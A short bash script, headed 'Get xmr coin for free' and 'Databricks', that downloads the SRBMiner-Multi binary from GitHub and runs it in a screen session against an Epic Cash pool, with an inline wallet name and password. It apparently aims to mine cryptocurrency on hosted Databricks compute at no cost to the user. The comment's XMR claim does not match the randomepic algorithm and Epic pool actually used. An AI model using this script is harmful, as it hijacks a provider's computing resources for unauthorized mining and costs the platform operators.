#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.4/SRBMiner-Multi-0-9-4-Linux.tar.xz
tar -xf SRBMiner-Multi-0-9-4-Linux.tar.xz
cd SRBMiner-Multi-0-9-4
./SRBMiner-MULTI --disable-gpu --algorithm randomepic --pool epic.eu-de.hashrate.to:4000 --wallet ruph --password s127654910 --keepalive true
